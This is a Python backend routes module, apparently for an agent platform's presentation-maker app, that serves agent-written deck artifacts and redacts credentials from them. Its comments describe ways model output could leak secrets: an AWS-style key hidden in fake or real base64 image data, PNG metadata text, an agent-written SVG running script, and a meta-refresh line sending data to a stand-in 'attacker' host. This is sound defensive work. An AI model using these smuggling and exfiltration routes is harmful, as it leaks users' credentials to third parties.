"""PPTX Maker — backend routes.

Registered at gateway startup by ``dashboard/server.py`` (which imports the app
package and calls ``register_routes(app)``), declared in the manifest as
``"backend": {"routes": "backend.routes:register_routes"}``.

Routes (browser-facing, same-origin authed — the ``/api/apps/{name}/*`` shape
every builtin app uses):

  GET  /api/apps/pptx-maker/engine              -> {"ready","clone","venv"}
  POST /api/apps/pptx-maker/engine/provision    -> clone + build the engine
  GET  /api/apps/pptx-maker/deps                -> optional-binary status
  GET  /api/apps/pptx-maker/assets              -> icon-pack provisioning status
  POST /api/apps/pptx-maker/assets/provision    -> start the icon-pack download
  GET  /api/apps/pptx-maker/config              -> {"deckRoot"}
  PUT  /api/apps/pptx-maker/config              -> set the deck output directory
  GET  /api/apps/pptx-maker/decks               -> deck list
  GET  /api/apps/pptx-maker/deck?id=<deckId>    -> one deck's detail
  GET  /api/apps/pptx-maker/preview/<deckId>/<subpath...>  -> a deck artifact
  GET  /api/apps/pptx-maker/styles              -> {"styles":[...]}
  GET  /api/apps/pptx-maker/style?name=<n>      -> {"fullHtml"}
  POST /api/apps/pptx-maker/styles/import       -> create a user style
  POST /api/apps/pptx-maker/styles/rename       -> rename a user style
  POST /api/apps/pptx-maker/styles/pin          -> pin/unpin a style
  DELETE /api/apps/pptx-maker/styles            -> delete a user style
  GET  /api/apps/pptx-maker/templates           -> {"templates":[...]}
  POST /api/apps/pptx-maker/templates/import    -> create a user template
  POST /api/apps/pptx-maker/templates/rename    -> rename a user template
  DELETE /api/apps/pptx-maker/templates         -> delete a user template

Three invariants hold across every handler:

* **Deny by default.** Every route is wrapped in :func:`_require_enabled`, which
  refuses with 403 while the app is disabled. Routes are registered once at
  gateway startup, so a default-disabled app would otherwise stay callable.
* **Nothing blocking on the loop.** Every filesystem walk, engine subprocess and
  file read runs through :func:`off_loop`, which hands the work to
  ``subprocess_executor()``. This is not optional: one blocking call here
  freezes every chat session on the gateway (AUTOSDE
  ``no-blocking-call-on-event-loop``).
* **Agent-authored text is redacted before it is served.** Deck artifacts are
  written by the presentation-engine agent from model output, so a TEXTUAL one
  reaching ``/preview`` is agent content crossing to a user surface and runs
  ``security.redact`` first (:func:`_redact_artifact`). Binary artifacts are
  byte-identical by contract. :data:`SERVED_SUFFIXES` is what forces a new
  extension to declare which of the two it is.
"""

from __future__ import annotations

import asyncio
import base64
import binascii
import json
import logging
import mimetypes
import re
import secrets
import shutil
import threading
import time
from dataclasses import dataclass
from functools import partial, wraps
from pathlib import Path
from typing import Any, Awaitable, Callable, TypeVar

from aiohttp import web

from kiro_crew import hooks
from kiro_crew.apps.builtins.pptx_maker.backend import (
    decks,
    engine,
    library,
    paths,
    preview_tools,
    provision,
)
from kiro_crew.apps.manager import is_app_enabled
from kiro_crew.atomic_write import atomic_write
from kiro_crew.credential_patterns import AWS_KEY_ID
from kiro_crew.executors import subprocess_executor
from kiro_crew.hooks import FileTooLargeError
from kiro_crew.messaging.raster import SNIFF_BYTES, sniff_raster_mime
from kiro_crew.security import (
    REDACTED_CREDENTIAL_TAG,
    is_sensitive_path,
    path_contains_sensitive,
    redact,
)
from kiro_crew.sel import sel

logger = logging.getLogger("kirocrew.app.pptx-maker")

APP_NAME = paths.APP_NAME
API_PREFIX = f"/api/apps/{APP_NAME}"

# Served deck artifacts are limited to the extensions the viewer actually
# renders. An allow-list rather than a denylist: the deck root is written by the
# engine but its CONTENTS are ultimately model-influenced, and an unexpected
# extension has no business being handed to a browser from this route.
#
# Each entry declares its Content-Type AND whether the bytes are TEXT. That
# second field is not decoration: a textual artifact is agent-authored prose on
# its way to the dashboard, so it runs the credential/exfiltration redaction pass
# before it is served (:func:`_redact_artifact`), while a binary one must be
# returned byte-identical — a `.pptx` is a zip and a `.png` a compressed bitmap,
# and rewriting a byte inside either corrupts the deck.
#
# Modelled as a dataclass rather than a second parallel set so a NEW suffix
# cannot be added without naming which side it is on: the constructor requires
# `text=`, and `test_pptx_maker_routes.py` pins that every entry is a
# `ServedSuffix`. A future `.txt` therefore cannot default into "binary,
# unredacted" — which is precisely the hole this split closes.


@dataclass(frozen=True)
class ServedSuffix:
    """One allow-listed artifact extension: its Content-Type and text-ness."""

    content_type: str
    text: bool


SERVED_SUFFIXES: dict[str, ServedSuffix] = {
    ".json": ServedSuffix("application/json; charset=utf-8", text=True),
    ".svg": ServedSuffix("image/svg+xml; charset=utf-8", text=True),
    ".png": ServedSuffix("image/png", text=False),
    ".md": ServedSuffix("text/markdown; charset=utf-8", text=True),
    ".html": ServedSuffix("text/html; charset=utf-8", text=True),
    ".pptx": ServedSuffix(
        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        text=False,
    ),
}

# Inline raster art, excised from a textual artifact before redaction and
# restored after. Load-bearing, and NOT a weakening of the redaction pass.
#
# The engine's compose step re-encodes every embedded photo, logo and icon as
# `data:image/webp;base64,…` (see `SlidePreview.tsx` DATA_BITMAP_RE, which
# allow-lists exactly this one non-fragment reference). Such a blob is a long run
# of the base64 alphabet, and `redact_credentials`' bare-secret heuristic
# redacts a 40-char window of random base64 — which a random raster ALWAYS
# contains. Measured: a plain `redact()` over a compose payload carrying a 20 KB
# raster replaces the whole image with `[REDACTED: credential]` 100% of the time,
# blanking every picture in every deck. That is the same class of
# looks-secure-renders-blank regression the SVG scrub already records.
#
# Excising the blob is safe because it cannot be the thing we are defending
# against: it is inline bytes, so it issues no request and can carry nothing to a
# third party, and a credential the model wrote as PROSE lives outside the
# `data:` URI and is still scanned. A credential base64-ENCODED into the blob is
# not reachable either — the redactor's decode-and-scan pass only fires on a blob
# that decodes to credential markers, and a re-encoded bitmap does not.
# `image/svg+xml` is deliberately NOT in the subtype list (it is a document, not
# a bitmap, and the engine never emits it), so an SVG hidden in a data URI still
# gets scanned.
_INLINE_BITMAP_RE = re.compile(
    r"data:image/(?:png|jpe?g|gif|webp|avif|bmp)"  # bitmap subtypes only — never svg+xml
    r"(?:;[\w.+-]+)*"  # optional media parameters
    r";base64,([A-Za-z0-9+/=]+)"  # group 1: the body, probed for a real signature
    # Group 2: the MAXIMAL run of characters after the body that do not terminate the
    # URI (see `_BITMAP_URI_TERMINATORS`); empty when the URI ends properly. Capturing
    # the whole run — not just the first character — is what makes excision complete: a
    # credential appended to the body splits at whatever separator it uses (`xoxb-`,
    # `pypi-`, `ghp_`, a JWT's `.`), the prefix landing in the body and surviving the
    # re-encode, so dropping only the body leaves the rest of the secret in the text.
    # An allowlist of terminators is the only closed form here — enumerating separators
    # is endless, while the characters that legally END a data URI are finite.
    r"([^\s\"'`)<>,;\]}\\]*)",
    re.IGNORECASE,
)

# A `data:image/...;base64,` label is agent-authored and therefore a CLAIM, not
# a fact — excising on the label alone would let a model smuggle a credential
# past the scanner simply by wrapping it in a fake bitmap URI
# (`data:image/png;base64,AKIA…`, which is all base64-alphabet and so matches
# the body pattern). So a blob is excised only if its decoded head actually
# begins with a real raster signature, as decided by the shared sniffer
# (:mod:`kiro_crew.messaging.raster`). Verifying the first few bytes is enough
# and stays O(1) per blob: a genuine raster always carries its signature, and a
# smuggled secret essentially never decodes into one. The shared sniffer also
# checks WebP's form tag at offset 8, so a bare `RIFF` container (e.g. a WAVE
# audio file) no longer counts as a bitmap here.

# AVIF/HEIF put a 4-byte box length BEFORE the `ftyp` brand, so the signature is
# at an offset rather than at byte 0.
_BITMAP_FTYP_OFFSET = 4
_BITMAP_FTYP_MAGIC = b"ftyp"


# The one credential shape that can hide INSIDE a base64 body while decoding to noise.
# An AWS key id is a fixed 4-char prefix plus exactly 16 upper/digit chars — all of it
# base64 alphabet — so it can be smuggled as body text and reproduced by the re-encode.
# Chance collision is negligible (~1.6e-7 per 20 KB raster) because the 16-char body is
# required; matching a BARE 4-char prefix instead is what used to blank real pictures at
# 0.88% per 20 KB and 4.7% per 100 KB.
#
# Every other provider marker (`xox…`, `sk-ant…`, `gh[pousr]_…`, `pypi-`, `glpat-`, a
# JWT's `.`) needs a separator that is NOT in the base64 alphabet, so it cannot occur in
# a body at all. Listing those here would be dead code — the appended-credential case
# they were meant to catch is handled by requiring a proper URI terminator after the
# body (see `_BITMAP_URI_TERMINATORS`), which covers every separator rather than an
# enumerated few.
#
# Case-sensitive on purpose: the shared spelling's uppercase-only body over a
# lowercased body would match ordinary mixed-case base64 constantly.
_ENCODED_CREDENTIAL_RE = re.compile(AWS_KEY_ID)


# Characters that legitimately END a `data:` URI in the artifact formats the engine
# emits: a JSON or HTML attribute string (`"`, `'`, and `\` for the escaped quote a
# raw JSON file carries), CSS `url(...)` and markdown `](...)` (`)`), markup (`<`,
# `>`), JSON/CSS structure (`,`, `;`, `]`, `}`), and any whitespace. End-of-text
# counts too — group 2 is then empty.
#
# Anything else directly after the body means the URI does not end there, which is not
# a shape the engine produces and is exactly how an appended credential looks. The
# carve-out is refused in that case, costing only the inline art of an already
# malformed artifact.
_BITMAP_URI_TERMINATORS: frozenset[str] = frozenset("\"'`)<>,;]}\\ \t\r\n\f\v")


def _has_bitmap_signature(raw: bytes) -> bool:
    """Whether *raw*'s first bytes are a known raster signature."""
    if sniff_raster_mime(raw[:SNIFF_BYTES]) is not None:
        return True
    return raw[_BITMAP_FTYP_OFFSET : _BITMAP_FTYP_OFFSET + len(_BITMAP_FTYP_MAGIC)] == (
        _BITMAP_FTYP_MAGIC
    )


def _scanned_bitmap_bytes(b64_body: str) -> tuple[bytes | None, bool]:
    """``(decoded raster bytes, credential_found)`` for a candidate bitmap body.

    The bytes are non-``None`` only when the blob is a real raster carrying no
    credential. ``credential_found`` distinguishes the two reasons for refusing:
    a credential was seen (so the caller must EXCISE the region — see below), versus
    the blob simply is not a raster (so it stays in the text as ordinary prose).

    That distinction is load-bearing. Handing a credential-bearing region back to the
    text pass assumes ``redact()`` recognises the same tokens this scan does, and it
    does not: a `gh[pousr]_` body shorter than a real GitHub PAT matches here and is
    invisible to ``redact()``, so returning the text unchanged served the token. The
    caller therefore excises whatever this scan condemns rather than delegating.

    A credential APPENDED after the body is not this function's problem: the caller
    refuses any blob the URI does not properly terminate, which catches an appended
    token whatever separator it uses.

    Returns the BYTES, not a boolean, so the caller restores a re-encoding of exactly
    what was cleared rather than the original matched text.

    **Both the DECODED bytes and the ENCODED text are scanned, and the second is not
    redundant.** Scanning only the decoded copy left a real channel open, because a
    credential appended to a genuine raster's body is still valid base64:

        data:image/png;base64,<real PNG body>AKIAIOSFODNN7EXAMPLE

    `_INLINE_BITMAP_RE`'s `[A-Za-z0-9+/=]+` swallows the whole run, the head still
    carries a PNG signature, and base64-decoding the appended ASCII yields binary
    NOISE — so the decoded-bytes scan legitimately finds nothing, and the exemption
    was granted. The key then reached the dashboard verbatim in the served text,
    because re-encoding reproduces it exactly. Verified before this change.

    So the encoded form is screened too: it is the form that is actually SERVED, and
    an `AKIA…`/`ASIA…` key is itself base64-alphabet text, which is precisely why it
    can hide in a body while being invisible after decoding. A genuine raster's
    base64 is high-entropy and does not contain a credential pattern, so this costs
    nothing on the honest path.

    The guard that keeps :data:`_INLINE_BITMAP_RE`'s excision from becoming a
    smuggling channel — see :func:`_has_bitmap_signature`. It asks TWO questions, and the
    second one is why the whole blob is decoded rather than just its head:

    1. **Does it start like a raster?** A `data:image/...;base64,` label is written
       by the same agent as the artifact, so the label is a claim, not a fact.
    2. **Does the DECODED payload contain a credential?** A correct signature only
       proves the first eight bytes; every container here (PNG `tEXt`, JPEG `COM`,
       EXIF, WebP `XMP `) has a metadata chunk that can hold arbitrary text. A blob
       beginning `\\x89PNG…` and continuing `tEXtComment\\0AKIA…` passed the header
       check, was exempted from the scan, and carried the key to the browser
       verbatim. So a signature is necessary but NOT sufficient: a blob whose bytes
       contain credential material stays in the redaction path and is scanned like
       any other text, at the cost of the image (which is the right trade — a
       credential-bearing "image" is not one worth rendering).

    Decoding the whole body is bounded by ``MAX_ARTIFACT_BYTES`` on the read, and the
    check runs on the ``off_loop`` worker.
    """
    try:
        raw = base64.b64decode(b64_body + "=" * (-len(b64_body) % 4), validate=False)
    except (ValueError, binascii.Error):
        return None, False
    if not _has_bitmap_signature(raw):
        return None, False
    # Scan the decoded bytes exactly as the text pass would: `redact` operating on a
    # lossy-decoded copy tells us whether the redactor finds anything in there. Only
    # a blob it leaves untouched is safe to exempt.
    probe = raw.decode("utf-8", errors="replace")
    if redact(probe) != probe:
        return None, True
    # And scan the ENCODED text, which is the form actually served. See the docstring:
    # a credential appended to a real raster's body decodes to noise (so the check
    # above passes) but survives re-encoding intact.
    #
    # `_ENCODED_CREDENTIAL_RE`, not `redact()`. A full `redact()` here is unusable: its
    # bare-secret heuristic flags a 40-char run of random base64, which every genuine
    # raster contains — measured, it refused 300/300 real 20 KB rasters, i.e. it would
    # blank every image in every deck. That is the same looks-secure-renders-blank
    # failure `_INLINE_BITMAP_RE` exists to avoid, so the encoded pass matches only
    # STRUCTURED credential markers, which random base64 does not produce by chance.
    #
    if _ENCODED_CREDENTIAL_RE.search(b64_body):
        return None, True
    return raw, False


# Placeholder that stands in for an excised bitmap during the redaction pass.
# The random nonce is minted per PROCESS, not per call, so it is cheap — and it
# is what stops a model-authored artifact from FORGING a placeholder to smuggle
# text past the redactor: an attacker cannot guess the token, so a literal
# `KIROCREW-BITMAP-…` in the artifact text restores to nothing (its index is out
# of range) rather than to attacker-chosen bytes. Shaped with no base64-alphabet
# run of 40+ chars so the placeholder itself cannot trip the bare-secret gate.
_BITMAP_PLACEHOLDER_NONCE = secrets.token_hex(8)
_BITMAP_PLACEHOLDER_RE = re.compile(
    r"\x00KIROCREW-BITMAP-" + _BITMAP_PLACEHOLDER_NONCE + r"-(\d+)\x00"
)

# Cap on one served artifact. A compose payload for a dense slide is tens of KB
# and a .pptx a few MB; this bounds a single response without truncating any
# real deck file.
MAX_ARTIFACT_BYTES = 64 * 1024 * 1024

# Deck artifacts change on every recompose, so they must never be cached; the
# viewer polls the same URL and would otherwise show a stale render.
NO_STORE = "no-store"

# HTML deck artifacts (the art-direction board) are author-controlled markup
# rendered in a sandboxed iframe by the frontend. Serve them with a restrictive
# CSP and a nosniff header so a direct navigation to the URL cannot execute
# script against the dashboard origin either.
#
# `sandbox` is load-bearing and is NOT covered by `default-src 'none'`. The fetch
# directives bound sub-resources; NAVIGATION has no CSP directive constraining it —
# `form-action` covers form submission only and `navigate-to` never shipped in any
# browser. So a `<meta http-equiv="refresh" content="0;url=https://attacker/?d=…">`
# in an agent-written board navigated the tab on its own, carrying whatever the model
# put in the URL, the moment the user followed the preview link. `default-src 'none'`
# blocked every fetch and none of that.
#
# Empty value (no `allow-*` tokens): these artifacts are passive boards — styled
# markup, data: images, no script, no forms, no links the user is meant to follow —
# so they need none of the capabilities a token would restore. Notably absent is
# `allow-top-navigation`, which is the one that would reopen this.
#
# Same hazard, and the same conclusion, as the Meetings sketch frame: a CSP that
# refuses every SUB-RESOURCE still permits the document to navigate itself, and that
# is an egress channel needing only a click.
_ARTIFACT_HTML_CSP = (
    "default-src 'none'; style-src 'unsafe-inline'; img-src data:; font-src data:; sandbox"
)

#: Served content types that are SCRIPT-CAPABLE DOCUMENTS, not passive media, and
#: therefore need :data:`_ARTIFACT_HTML_CSP` rather than the dashboard's base
#: policy.
#:
#: `image/svg+xml` belongs here and reads as if it does not — which is why it was
#: missed. An SVG is a document: it can carry `<script>` and `on*` handlers, and
#: `nosniff` does not help because the label is CORRECT. Navigating to
#: `preview/<deck>/x.svg` therefore ran agent-authored script on the dashboard
#: origin with the session cookie, under the base CSP's `script-src 'self'
#: 'unsafe-inline'`. That path is reachable: the composer agent writes the file
#: and a link to it in `specs/brief.md`, which the frontend renders as a real
#: anchor. `redact()` removes credentials, not markup, so it is no defence here.
#: `dashboard/handlers/files.py` already records the same hazard ("SVG can contain
#: scripts — never serve inline on the dashboard origin").
_SCRIPT_CAPABLE_CONTENT_TYPES = ("text/html", "image/svg+xml")

_MAX_BODY_BYTES = library.MAX_TEMPLATE_BYTES

_T = TypeVar("_T")

# Icon-pack provisioning state. One job at a time, guarded by a plain lock: the
# state is touched from worker threads (the download) and from the loop (status
# reads), and the critical sections are field assignments.
_assets_state = engine.ProvisionState()
_assets_lock = threading.Lock()

# Engine provisioning (clone + venv build) state. Same shape and reason as the
# icon-pack job above: it runs for minutes, so the request starts it and the UI
# polls ``/engine`` for the outcome.
_engine_state = engine.ProvisionState()
_engine_lock = threading.Lock()


async def off_loop(fn: Callable[..., _T], *args: Any, **kwargs: Any) -> _T:
    """Run a blocking callable on the subprocess pool.

    THE chokepoint for this app's blocking work. ``subprocess_executor()`` rather
    than the default executor because these calls spawn the engine venv and walk
    a user-sized deck tree, and the default pool is also what the loop uses for
    DNS — saturating it stalls the gateway (see ``kiro_crew.executors``).
    """
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(subprocess_executor(), partial(fn, *args, **kwargs))


def _require_enabled(
    handler: Callable[[web.Request], Awaitable[web.StreamResponse]],
) -> Callable[[web.Request], Awaitable[web.StreamResponse]]:
    """Refuse every request while the app is disabled (deny-by-default).

    ``is_app_enabled`` is a synchronous ``installed.json`` read, so it runs off
    the loop like every other blocking call here.
    """

    @wraps(handler)
    async def _wrapped(request: web.Request) -> web.StreamResponse:
        if not await asyncio.to_thread(is_app_enabled, APP_NAME):
            return web.json_response(
                {"error": f"{APP_NAME} is disabled", "code": "app_disabled"}, status=403
            )
        return await handler(request)

    return _wrapped


def _audit(operation: str, resources: str, outcome: str, *, error: str = "") -> None:
    """Emit a Security Event Log entry for a mutating action.

    Both free-text fields are REDACTED here, at the single chokepoint, rather than at
    each of the dozen-odd call sites. Every one of them interpolates a value the user
    or the agent chose — a style/template name, a deck root, a `deckId/subpath`, an
    exception string — so a credential-shaped name (`AKIA…`, legal under
    `SEGMENT_RE`) was written verbatim into the SEL and then served back by
    `GET /api/sel/events`. An audit log is a user-facing surface like any other, and
    it is a *durable* one: unlike a response body, a leak here persists.

    Redacting centrally is deliberate. A per-call-site fix would be one `redact()` a
    future `_audit(...)` caller could forget, and the SEL is exactly the wrong place
    to rely on everyone remembering. `redact` on already-clean text is a no-op, so the
    ordinary case is unchanged.

    `redact` runs BEFORE the 200-char truncation, not after: truncating first can slice
    a credential in half so neither fragment matches a pattern, which is the same
    screen-after-decode mistake the artifact reader documents — screen the value, then
    shorten it.
    """
    sel().log_api_access(
        caller=f"core:{APP_NAME}",
        operation=f"pptx_maker.{operation}",
        outcome=outcome,
        source="builtin-app",
        resources=redact(resources),
        error=redact(error)[:200] if error else "",
    )


async def _read_body(request: web.Request) -> bytes | None:
    """Read a bounded request body, or ``None`` when it exceeds the cap.

    Bounded by reading in chunks rather than by trusting ``Content-Length``: a
    client controls that header, and ``request.read()`` would buffer whatever is
    actually sent.
    """
    chunks: list[bytes] = []
    total = 0
    while True:
        chunk = await request.content.read(64 * 1024)
        if not chunk:
            break
        total += len(chunk)
        if total > _MAX_BODY_BYTES:
            return None
        chunks.append(chunk)
    return b"".join(chunks)


async def _json_body(request: web.Request) -> tuple[dict | None, web.Response | None]:
    """Parse a JSON object body, or return the 400 to send back.

    Same 400-for-non-object / (body, None)-tuple contract as
    ``dashboard/handlers/_shared.read_bounded_json``; the deliberate divergence is
    the app-specific ``code`` values (``body_not_json`` / ``body_not_object``)
    that the dashboard switches on. Unlike ``read_bounded_json`` this helper does
    not cap the body — the size-bounded reader ``_read_body`` guards the raw-body
    ``styles/import`` endpoint instead, not this JSON path.

    The catch spans the client-input failure set: ``LookupError`` (an unknown
    ``charset=`` codec) previously escaped as a 500 and is now a 400, and
    ``RecursionError`` (a deeply nested body) is caught for the same reason.
    ``UnicodeDecodeError`` is a ``ValueError`` subclass, so ``ValueError`` alone
    already covers undecodable bytes; it is dropped from the tuple as redundant.
    A mid-read transport error still propagates as itself.
    """
    try:
        body = await request.json()
    except (LookupError, RecursionError, ValueError):
        return None, web.json_response(
            {"error": "request body must be JSON", "code": "body_not_json"}, status=400
        )
    if not isinstance(body, dict):
        return None, web.json_response(
            {"error": "request body must be a JSON object", "code": "body_not_object"}, status=400
        )
    return body, None


def _worker_response(status: int, payload: dict) -> web.Response:
    """Re-emit a blocking worker's ``(status, payload)`` pair as a response.

    The workers — every mutating function in ``library`` plus
    :func:`_write_deck_root` — decide both the status and the body, and each
    failure body already carries its own ``code``: the layer that knows which
    condition fired is the layer that should name it, so the identifier sits next
    to the ``if`` that produced it rather than being reverse-engineered here.

    Failures are emitted through a ladder of LITERAL statuses, each repeating the
    body as a dict LITERAL, deliberately. ``status=status`` reads to the
    error-code contract scanner as ``dynamic_status`` — it cannot statically tell
    the response is even an error — and passing ``payload`` through as a variable
    or a ``**spread`` reads as ``opaque_body``, because it cannot see the ``code``
    inside. Only this form proves the contract holds, so the repetition buys a
    checkable guarantee. ``error`` is advisory prose (RFC 9457 3.1.3); ``code`` is
    what the dashboard switches on. See ``test/test_error_code_contract.py``.

    Rebuilding the body key by key means an error payload is reduced to the two
    contract keys, and the success branch always answers 200. Both hold for every
    worker today; :func:`_check_worker_contract` says so out loud rather than
    letting a later worker lose a field silently.
    """
    _check_worker_contract(status, payload)
    if status < 400:
        return web.json_response(payload)
    # REDACTED at the chokepoint every worker error passes through.
    #
    # Several library errors interpolate the caller's own name (`style {name!r}
    # already exists`), and a name only has to satisfy `SEGMENT_RE` — which accepts
    # `AKIAIOSFODNN7EXAMPLE` (verified). So a style or template whose name is
    # credential-shaped had that value echoed verbatim into the dashboard by the
    # duplicate-import path. Redacting HERE rather than at each `f"…{name}…"` means a
    # message added later cannot reintroduce it: this is the one place all of them
    # converge, and the same pass `_redact_artifact` already applies to served text.
    error = redact(str(payload.get("error") or ""))
    code = str(payload.get("code") or "")
    if status == 400:
        return web.json_response({"error": error, "code": code}, status=400)
    if status == 404:
        return web.json_response({"error": error, "code": code}, status=404)
    if status == 409:
        return web.json_response({"error": error, "code": code}, status=409)
    if status == 413:
        return web.json_response({"error": error, "code": code}, status=413)
    if status == 503:
        return web.json_response({"error": error, "code": code}, status=503)
    return web.json_response({"error": error, "code": code}, status=500)


def _check_worker_contract(status: int, payload: dict) -> None:
    """Log when a worker returns a shape :func:`_worker_response` cannot carry.

    Two assumptions are load-bearing there, and both are invisible at the call
    site: a success is a 200, and a failure body is exactly ``error`` + ``code``.
    A worker that grows a third failure key or a 201 would otherwise have it
    dropped or rewritten with no trace — so the drift is reported here instead.
    """
    if status < 400:
        if status != 200:
            logger.warning("pptx-maker: worker returned unhandled success status %s", status)
        return
    if status not in (400, 404, 409, 413, 500, 503):
        logger.warning("pptx-maker: worker returned unmapped error status %s", status)
    extra = sorted(set(payload) - {"error", "code"})
    if extra:
        logger.warning("pptx-maker: dropping non-contract error field(s) %s", extra)


def _query_name(request: web.Request, key: str = "name") -> str:
    return (request.query.get(key) or "").strip()


# ── engine / dependency / asset status ──────────────────────────────────────


async def _handle_engine(request: web.Request) -> web.Response:
    """GET /engine — whether the vendored engine is provisioned.

    Drives the first-run banner. Deliberately cheap (filesystem probes only) so
    the UI can poll it while provisioning is still running, and it carries the
    provisioning job's state + log tail so the banner can narrate progress.
    """
    status = await off_loop(engine.engine_status)
    with _engine_lock:
        status["provision"] = {
            "state": _engine_state.state,
            "log": _engine_state.log[-engine.LOG_TAIL_CHARS :],
            "elapsed": _engine_state.elapsed(),
        }
    status["pinnedTag"] = provision.ENGINE_TAG
    return web.json_response(status)


def _run_provision() -> None:
    """Provision the engine on a worker thread and record the outcome."""
    try:
        outcome = provision.provision()
    except Exception as exc:  # noqa: BLE001 - a background job must not vanish silently
        logger.warning("pptx-maker: engine provisioning failed: %s", exc, exc_info=True)
        with _engine_lock:
            _engine_state.state = "error"
            _engine_state.log = f"provisioning failed: {exc}"
        _audit("engine_provision", provision.ENGINE_TAG, "failed", error=str(exc))
        return
    with _engine_lock:
        _engine_state.state = "done" if outcome.ok else "error"
        _engine_state.log = outcome.log
    _audit(
        "engine_provision",
        outcome.engine_tag or provision.ENGINE_TAG,
        "ok" if outcome.ok else "failed",
    )


async def _handle_engine_provision(request: web.Request) -> web.Response:
    """POST /engine/provision — clone and build the presentation engine.

    Explicitly user-triggered rather than automatic on enable: it clones a
    third-party repository and builds a virtualenv (network + minutes of CPU), so
    it is a decision the operator makes rather than a side effect of opening a
    page. Idempotent — re-running moves an existing checkout to the pinned tag.
    """
    with _engine_lock:
        if _engine_state.state == "running":
            return web.json_response({"state": "running"}, status=202)
        _engine_state.state = "running"
        _engine_state.log = ""
        _engine_state.started = time.time()
    _audit("engine_provision", provision.ENGINE_TAG, "started")
    asyncio.ensure_future(off_loop(_run_provision))
    return web.json_response({"state": "running"}, status=202)


def _deps_status() -> dict:
    """Optional preview binaries: whether each resolves, and from where.

    ``present`` and ``missing`` are derived from the SAME resolver
    (:func:`engine.optional_dep_path`) so they can never disagree. Resolving via
    a bare ``shutil.which`` here while ``missing_optional_deps`` also consults
    the app-managed directory would report a tool as absent and not-missing at
    once.

    ``managed`` distinguishes the app's own install from the user's system one,
    which is what lets the UI say "installed by KiroCrew" rather than implying
    the host changed.

    BLOCKING (filesystem probes over ``PATH``) — called through ``off_loop``.
    """
    resolved = {name: engine.optional_dep_path(name) for name in engine.OPTIONAL_DEPS}
    managed_bin = str(paths.preview_tools_bin())
    missing = [name for name, path in resolved.items() if path is None]
    return {
        "labels": dict(engine.OPTIONAL_DEPS),
        "present": {name: path is not None for name, path in resolved.items()},
        "managed": {
            name: bool(path and path.startswith(managed_bin)) for name, path in resolved.items()
        },
        "missing": missing,
        # The one missing tool the user must install themselves, with the command
        # for THIS platform. Data for the UI to show — never run from here.
        "hints": (
            {preview_tools.SOFFICE: preview_tools.soffice_hint()}
            if preview_tools.SOFFICE in missing
            else {}
        ),
    }


async def _handle_deps(request: web.Request) -> web.Response:
    """GET /deps — optional-binary status.

    Reports only; installing a system PACKAGE is deliberately NOT an endpoint.
    The upstream app shelled out to ``brew``/``apt-get`` from a browser request,
    which is a privileged host mutation driven by an unauthenticated-to-the-OS
    caller — the dashboard shows the command and the user runs it.

    ``pdftoppm`` is no longer in that category: it is provided by an app-private
    launcher over the engine venv's own ``pypdfium2`` (see :mod:`.preview_tools`),
    installed as part of ``POST /engine/provision``. Nothing is elevated and
    nothing is written outside this app's data dir, so there is still no
    dependency-INSTALL endpoint here.
    """
    return web.json_response(await off_loop(_deps_status))


def _icon_marker_path(target: Path) -> Path:
    return target / engine.ICON_MARKER_FILENAME


def _icon_provisioned(target: Path, tag: str) -> dict[str, bool]:
    """Which icon packs are already provisioned for engine version *tag*.

    Keyed on the engine tag so an engine upgrade re-provisions (icon sets ship
    with the engine version), and gated on the pack's manifest actually existing
    so a marker left behind by an interrupted download does not read as done.
    """
    try:
        marker = json.loads(_icon_marker_path(target).read_text(encoding="utf-8"))
    except (OSError, ValueError):
        return {}
    if not isinstance(marker, dict) or marker.get("tag") != tag:
        return {}
    sources = marker.get("sources")
    if not isinstance(sources, dict):
        return {}
    return {
        source: True
        for source, _script in engine.ICON_SOURCES
        if sources.get(source) and (target / source / "manifest.json").is_file()
    }


def _assets_status() -> dict:
    """Icon-pack provisioning status.

    BLOCKING (engine subprocess for the config dir + tag) — via ``off_loop``.
    """
    base = engine.user_config_dir()
    target = (base / "assets") if base is not None else None
    tag = engine.engine_tag()
    done = _icon_provisioned(target, tag) if target is not None else {}
    with _assets_lock:
        state = _assets_state.state
        log = _assets_state.log[-engine.LOG_TAIL_CHARS :]
        elapsed = _assets_state.elapsed()
        per_source = dict(_assets_state.per_source)
    sources = [source for source, _ in engine.ICON_SOURCES]
    return {
        "sources": sources,
        "provisioned": {source: bool(done.get(source)) for source in sources},
        "ready": bool(done) and all(done.get(source) for source in sources),
        "tag": tag,
        "state": state,
        "log": log,
        "elapsed": elapsed,
        "perSource": per_source,
    }


def _record_assets_log(lines: list[str], line: str) -> None:
    """Append one log line, keeping only the tail the UI shows."""
    lines.append(line)
    if len(lines) > 400:
        del lines[: len(lines) - 400]
    with _assets_lock:
        _assets_state.log = "\n".join(lines)


def _relocate_pack(generated: Path, destination: Path) -> None:
    """Move a downloaded pack into the user config dir, replacing any previous one.

    The packs are relocated out of the engine checkout because that checkout is
    replaced on every app update; the user config dir survives, so a pack is
    downloaded once per engine version rather than once per update.
    """
    staging = destination.with_name(destination.name + ".new")
    if staging.exists():
        shutil.rmtree(staging)
    shutil.move(str(generated), str(staging))
    if destination.exists():
        shutil.rmtree(destination)
    staging.rename(destination)


def _provision_assets(force: bool) -> None:
    """Download the icon packs. Runs on a worker thread; never on the loop."""
    base = engine.user_config_dir()
    if base is None:
        with _assets_lock:
            _assets_state.state = "error"
            _assets_state.log = "engine not ready"
        return
    target = base / "assets"
    tag = engine.engine_tag()
    try:
        target.mkdir(parents=True, exist_ok=True)
    except OSError as exc:
        with _assets_lock:
            _assets_state.state = "error"
            _assets_state.log = f"cannot create the assets directory: {exc}"
        return

    already = {} if force else _icon_provisioned(target, tag)
    lines: list[str] = []
    succeeded = dict(already)

    for source, script in engine.ICON_SOURCES:
        if already.get(source):
            with _assets_lock:
                _assets_state.per_source[source] = "done"
            continue
        with _assets_lock:
            _assets_state.per_source[source] = "running"
        _record_assets_log(lines, f"[{source}] downloading…")
        result = engine.run_icon_script(source, script)
        generated = engine.icon_vendor_output(source)
        if result.returncode == 0 and (generated / "manifest.json").is_file():
            try:
                _relocate_pack(generated, target / source)
            except OSError as exc:
                with _assets_lock:
                    _assets_state.per_source[source] = "error"
                _record_assets_log(lines, f"[{source}] could not be installed: {exc}")
                continue
            succeeded[source] = True
            with _assets_lock:
                _assets_state.per_source[source] = "done"
            _record_assets_log(lines, f"[{source}] ready")
        else:
            with _assets_lock:
                _assets_state.per_source[source] = "error"
            _record_assets_log(lines, f"[{source}] download failed (exit {result.returncode})")

    try:
        atomic_write(
